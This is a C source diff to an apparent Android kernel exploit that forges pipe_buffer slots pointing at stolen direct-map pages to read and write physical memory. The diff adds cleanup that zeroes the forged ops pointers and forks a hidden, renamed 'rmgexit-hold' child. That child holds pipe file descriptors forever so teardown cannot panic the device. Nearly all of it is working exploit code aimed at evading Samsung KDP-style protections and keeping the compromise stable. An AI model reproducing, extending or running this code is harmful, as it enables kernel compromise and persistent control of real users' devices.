@@ -249,7 +249,133 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   return base;
 }
 
+/* ================= exit-path protection (fixwave 2026-10) =================
+ * Field evidence: device resets strike around process-exit/teardown moments
+ * (3x download mode on CZDE). Panic class (MHL ghostlock-a17, same CVE
+ * family, Samsung KDP): forged pipe_buffer slots carry ops ==
+ * anon_pipe_buf_ops while pointing at stolen direct-map pages; at pipe
+ * teardown free_pipe_info() walks the ring and anon_pipe_buf_release()
+ * -> __folio_put() hits a reserved/foreign page -> bad_page -> panic.
+ * Two layers, both adapted from MHL's wq_umh_disarm_atexit() (their
+ * src/core/main.c:2615):
+ *   ring disarm — zero the ops pointer of every slot we forged so
+ *     free_pipe_info's release loop skips it (kernel-side, best effort;
+ *     only possible while the ashmem/configfs alias is still live);
+ *   fork-hold  — before exit, fork a detached child (setsid, PDEATHSIG
+ *     cleared, stdio -> /dev/null) that inherits every fd and sleeps
+ *     forever: while it lives the parent's do_exit closes fds without
+ *     dropping the last pipe inode ref, so free_pipe_info never runs and
+ *     the whole anon_pipe_buf_release -> bad_page class at exit is
+ *     suppressed, not just the tracked slots.
+ * Residue (documented MHL parity): one sleeping "rmgexit-hold" per attempt
+ * (freed on reboot; if it is OOM/SIGKILL-killed the teardown BUGs fire
+ * then — no worse than before this fix). _exit() paths (env-gated
+ * diagnostics) and unhandleable signal deaths skip atexit by design. */
+static uintptr_t pipe_forge_ring_base;
+static uintptr_t pipe_forge_slot_addr;
+static int pipe_forge_slot_dirty;
+static int pipe_exit_hold_spawned;
+static int pipe_exit_protect_armed;
+
+static void pipe_exit_zero_slot_ops(int fd, uintptr_t slot_addr) {
+  uint64_t ops = 0;
+  if (kernel_read_data(fd, slot_addr + 16, &ops, sizeof(ops)) !=
+          (ssize_t)sizeof(ops) ||
+      ops == 0) {
+    return;
+  }
+  uint64_t zero = 0;
+  kernel_write_data(fd, slot_addr + 16, &zero, sizeof(zero));
+}
+
+void pipe_exit_disarm_forged_slots(void) {
+  if (!pipebuf_page_base || !is_direct_ptr(pipebuf_page_base)) {
+    return;
+  }
+  int fd = open_ashmem_device();
+  if (fd < 0) {
+    return;
+  }
+  /* liveness probe: a dead alias returns short and we skip the disarm;
+   * the fork-hold below covers the exit regardless */
+  uintptr_t probe = pipe_forge_ring_base ? pipe_forge_ring_base + 16
+                                         : pipebuf_page_base + 16;
+  uint64_t ops = 0;
+  if (kernel_read_data(fd, probe, &ops, sizeof(ops)) ==
+      (ssize_t)sizeof(ops)) {
+    if (pipe_forge_ring_base) {
+      for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
+        pipe_exit_zero_slot_ops(fd, pipe_forge_ring_base + off);
+      }
+    }
+    if (pipe_forge_slot_dirty && pipe_forge_slot_addr &&
+        (!pipe_forge_ring_base || pipe_forge_slot_addr < pipe_forge_ring_base ||
+         pipe_forge_slot_addr >= pipe_forge_ring_base + PIPE_SLAB_SIZE)) {
+      pipe_exit_zero_slot_ops(fd, pipe_forge_slot_addr);
+    }
+  }
+  close(fd);
+}
+
+/* atexit handler: pr_error exits with exit(-1) all over the failure paths,
+ * so the protection must run via atexit to cover them (userspace handlers
+ * run before do_exit's fd teardown). Raw syscalls only — other threads may
+ * still hold stdio locks while this runs. */
+static void pipe_exit_disarm_and_hold(void) {
+  pipe_exit_disarm_forged_slots();
+  if (pipe_exit_hold_spawned) {
+    return;
+  }
+  pipe_exit_hold_spawned = 1;
+  pid_t child = fork();
+  if (child != 0) {
+    return;
+  }
+  /* clear inherited PDEATHSIG first: the holder must outlive this process */
+  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
+  syscall(SYS_setsid);
+  syscall(SYS_prctl, PR_SET_NAME, "rmgexit-hold", 0, 0, 0);
+  int null_fd = (int)syscall(
+      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
+  if (null_fd >= 0) {
+    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
+      if (null_fd != fd) {
+        syscall(SYS_dup3, null_fd, fd, 0);
+      }
+    }
+    if (null_fd > STDERR_FILENO) {
+      syscall(SYS_close, null_fd);
+    }
+  } else {
+    syscall(SYS_close, STDIN_FILENO);
+    syscall(SYS_close, STDOUT_FILENO);
+    syscall(SYS_close, STDERR_FILENO);
+  }
+  struct timespec hold = {
+    .tv_sec = 86400,
+    .tv_nsec = 0,
+  };
+  for (;;) {
+    syscall(SYS_nanosleep, &hold, NULL);
+  }
+}
+
+void pipe_exit_protect_install(void) {
+  if (pipe_exit_protect_armed) {
+    return;
+  }
+  pipe_exit_protect_armed = 1;
+  atexit(pipe_exit_disarm_and_hold);
+}
+
+void pipe_exit_note_holder(void) {
+  pipe_exit_hold_spawned = 1;
+}
+
 uintptr_t prepare_pipe_buffer_page(void) {
+  /* forged rings can exist from here on — arm the exit protection before
+   * the first pipe object is created */
+  pipe_exit_protect_install();
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     make_pipe_object(pipe_fds_drain[i]);
   }
@@ -299,6 +425,12 @@ uintptr_t prepare_pipe_buffer_page(void) {
 }
 
 void reset_pipe_attempt(void) {
+  /* mid-run teardown is a reset moment too: zero forged slot ops BEFORE
+   * the rings below are closed and free_pipe_info walks them */
+  pipe_exit_disarm_forged_slots();
+  pipe_forge_ring_base = 0;
+  pipe_forge_slot_addr = 0;
+  pipe_forge_slot_dirty = 0;
   if (pipe_prepare_child > 0) {
     kill(pipe_prepare_child, SIGKILL);
     waitpid(pipe_prepare_child, NULL, 0);
@@ -575,10 +707,16 @@ int pipe_phys_read(
   if (patch != (ssize_t)sizeof(pb)) {
     int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                   (ssize_t)sizeof(saved);
+    if (!restore) {
+      pipe_forge_slot_addr = buf_addr;
+      pipe_forge_slot_dirty = 1;
+    }
     pr_error("pipe read buffer patch failed ret=%zd restore=%d\n",
              patch, restore);
     return 0;
   }
+  pipe_forge_slot_addr = buf_addr;
+  pipe_forge_slot_dirty = 1;
 
   ssize_t got = read(pipefd[0], out, len);
   int restored_ok =
@@ -587,6 +725,10 @@ int pipe_phys_read(
       kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) ==
           (ssize_t)sizeof(restored) &&
       memcmp(&restored, &saved, sizeof(saved)) == 0;
+  if (restored_ok) {
+    pipe_forge_slot_addr = 0;
+    pipe_forge_slot_dirty = 0;
+  }
   int ok = got == (ssize_t)len && restored_ok;
   if (!ok) {
     pr_error("pipe read failed got=%zd want=%zu restore=%d\n",
@@ -624,10 +766,16 @@ int pipe_phys_write(
   if (patch != (ssize_t)sizeof(pb)) {
     int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                   (ssize_t)sizeof(saved);
+    if (!restore) {
+      pipe_forge_slot_addr = buf_addr;
+      pipe_forge_slot_dirty = 1;
+    }
     pr_error("pipe write buffer patch failed ret=%zd restore=%d\n",
              patch, restore);
     return 0;
   }
+  pipe_forge_slot_addr = buf_addr;
+  pipe_forge_slot_dirty = 1;
 
   ssize_t wrote = write(pipefd[1], data, len);
   int restored_ok =
@@ -636,6 +784,10 @@ int pipe_phys_write(
       kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) ==
           (ssize_t)sizeof(restored) &&
       memcmp(&restored, &saved, sizeof(saved)) == 0;
+  if (restored_ok) {
+    pipe_forge_slot_addr = 0;
+    pipe_forge_slot_dirty = 0;
+  }
   int ok = wrote == (ssize_t)len && restored_ok;
   if (!ok) {
     pr_error("pipe write failed wrote=%zd want=%zu restore=%d\n",
@@ -649,6 +801,8 @@ void forge_pipe_buffers_on_page(
     int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
   struct user_pipe_buffer pb;
   memset(&pb, 0, sizeof(pb));
+  /* remember the forged ring for the exit-path disarm (ops zeroing) */
+  pipe_forge_ring_base = base;
   pb.page = direct_to_page(direct_addr);
   pb.offset = direct_addr & (PAGE_SIZE - 1);
   pb.len = for_write ? 0 : len + 1;
